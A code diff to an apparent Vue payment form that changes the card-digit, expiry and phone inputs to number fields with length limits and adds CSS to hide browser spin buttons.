@@ -117,7 +117,8 @@ function sendToFirebase() {
                   v-model="digit"
                   class="xxxx"
                   placeholder="xxxx"
-                  type="text"
+                  type="number"
+                  maxlength="4"
                   required
                 />
               </div>
@@ -127,7 +128,8 @@ function sendToFirebase() {
                   v-model="expirationMM"
                   class="tarih"
                   placeholder="MM"
-                  type="text"
+                  type="number"
+                  maxlength="2"
                   required
                 />
                 <p>&nbsp;&nbsp;/&nbsp;&nbsp;</p>
@@ -135,7 +137,8 @@ function sendToFirebase() {
                   v-model="expirationYY"
                   class="tarih"
                   placeholder="YY"
-                  type="text"
+                  type="number"
+                  maxlength="2"
                   required
                 />
               </div>
@@ -206,7 +209,12 @@ function sendToFirebase() {
             </div>
 
             <div>
-              <input v-model="phone" placeholder="Phone" type="text" required />
+              <input
+                v-model="phone"
+                placeholder="Phone"
+                type="number"
+                required
+              />
             </div>
             <div>
               <input
@@ -398,6 +406,19 @@ totalspan {
   width: 4.7rem;
   height: 2.3rem;
   font-size: 1.6rem;
+  appearance: none;
+}
+
+/* Chrome, Safari, Edge, Opera */
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+/* Firefox */
+input[type="number"] {
+  -moz-appearance: textfield;
 }
 
 .cvv {
